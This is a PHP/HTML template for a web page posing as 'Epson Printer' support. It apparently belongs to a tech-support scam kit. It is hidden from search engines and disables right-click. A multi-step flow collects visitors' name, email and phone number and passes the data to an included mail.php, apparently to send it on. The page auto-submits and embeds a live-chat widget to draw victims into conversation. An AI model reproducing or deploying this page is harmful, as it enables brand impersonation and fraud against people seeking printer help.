
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Epson Printer</title>      
        <meta name="description" content="">
        <meta name="keywords" content="" />
        <meta name="author" content="">
        <meta name="allow-search" content="yes"/>
        <meta name="revisit-after" content="1 day"/>
        <meta name="distribution" content="global"/>
        <meta name="expires" content="never"/>
        <meta name="rating" content="safe for kids"/>
        <meta name="page-topic" content="Epson Printer" />
        <link rel="canonical" href="<?php echo 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>" />
        <link href="images/favicon.ico" rel="shortcut icon" />
        <link href="css/bootstrap.css" rel="stylesheet" type="text/css" media="all"/>
        <link href="css/style.css" rel="stylesheet" type="text/css" media="all"/>
        <script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
        <link rel="stylesheet" href="css/font-awesome.min.css"/>
        <link href="https://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic,600,600italic,700,700italic,800,800italic" rel="stylesheet" type="text/css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    </head>
    <body oncontextmenu="return false;">
        <div class="header ">
            <div class="container">
                <nav class="navbar navbar-default">
                    <div class="navbar-header navbar-left">
                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                            <span class="sr-only">Toggle navigation</span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                            <span class="icon-bar"></span>
                        </button>
                        <h1><a class="navbar-brand" href="https://<?php echo $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; ?>"><img src="images/logo.png"/></a></h1>
                    </div>
                          
                </nav>
            </div>
        </div>
        <?php
        if (isset($_POST['flag'])) {
            if ($_POST['flag'] == 'first') {
                include 'step-2.php';
            } elseif ($_POST['flag'] == 'second') {
                include 'mail.php';
                include 'step-3.php';
            } elseif ($_POST['flag'] == 'third') {
                include 'step-4.php';
            }
        } else {
            include 'step-1.php';
        }
        ?>
        <!-- footer -->
        <footer class="agileinfo_footer_bottom footer hidden-xs">
            <div class="container">
                <div class="row">
                    <div class="col-md-2">
                        <ul class="footer-ul">
                            <li><a href="#">English (United States)</a> </li>
                        </ul>
                    </div>
                    <div class="col-md-10 footer-right">
                        <ul class="footer-ul">
                            <li><a href="#">Contact Epson Printer</a></li>
                            <li><a href="#">Privacy & cookies</a></li>
                            <li><a href="#">Terms of use</a></li>
                            <li><a href="#">&copy; Epson Printer 2021</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </footer> 
        <!-- //footer -->
        <script src="js/bootstrap.js"></script>
        <script>
            function skipIfMax(element) {
                max = parseInt(element.dataset.max)
                if (element.value.length >= max && element.nextElementSibling) {
                    element.nextElementSibling.focus();
                }
            }
        </script>
        <?php
        if (isset($_POST['flag'])) {
            if ($_POST['flag'] == 'second') {
                ?>
                <script>
                    setTimeout(function () {
                        $('#third').submit();
                    }, 5000);
                </script>
                <?php
            } elseif ($_POST['flag'] == 'first') {
                ?>
                <script>
                    $(document).ready(function () {
                        $('#submitBtn').click(function (e) {
                            var name = $('#name').val();
                            var number = $('#number').val();
                            var email = $('#email').val();
                            if (name == '') {
                                alert('Invalid Full Name');
                                $("#name").focus();
                                return false;
                            } else if (!/^([a-zA-Z0-9_\.\-\+])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/.test(email)) {
                                alert('Please specify a valid Email');
                                $("#email").focus();
                                return false;
                            } else if (!/\(?([0-9]{3})\)?([ .-]?)([0-9]{3})\2([0-9]{4})/.test(number) || (number.length > 11 || number.length < 10)) {
                                alert('Please specify a valid Phone Number');
                                $("#number").focus();
                                return false;
                            }
                        });
                    });
                </script>
                <?php
            }
        }
        ?>
        <!--Start of Tawk.to Script--> 
        <script type="text/javascript"> var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
            (function () {
                var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
                s1.async = true;
                s1.src = 'https://embed.tawk.to/5fe9bac8df060f156a91091e/1eqkg3b5o';
                s1.charset = 'UTF-8';
                s1.setAttribute('crossorigin', '*');
                s0.parentNode.insertBefore(s1, s0);
            })();
        </script> <!--End of Tawk.to Script-->
    </body>
</html>